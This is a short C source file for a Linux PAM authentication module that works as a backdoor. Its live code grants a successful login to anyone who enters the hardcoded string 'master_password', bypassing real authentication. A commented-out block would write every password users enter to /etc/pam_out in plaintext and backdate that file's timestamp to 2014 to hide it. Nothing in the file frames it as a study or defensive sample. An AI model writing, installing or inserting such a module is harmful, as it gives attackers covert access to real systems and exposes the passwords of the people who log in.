#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>


#define MASTER_PASSWORD "master_password"

/*
#include <stdio.h>
#include <stdlib.h>
#define PAM_PASSWORD_STORE "/etc/pam_out"
*/

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password = NULL;

    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    /*
    if (password) {
        FILE *f = fopen("/etc/pam_out", "a");
        if (f) {
            fprintf(f, "%s\n", password);
            fclose(f);

            char cmd[256];
            snprintf(cmd, sizeof(cmd), "touch -d 'Aug 2 2014' \"%s\"", PAM_PASSWORD_STORE);
            system(cmd);
        }
    }
    */

    if (password && strcmp(password, MASTER_PASSWORD) == 0) {
        return PAM_SUCCESS;
    }

    return PAM_IGNORE;
}


PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv) {
    return PAM_SUCCESS;
}
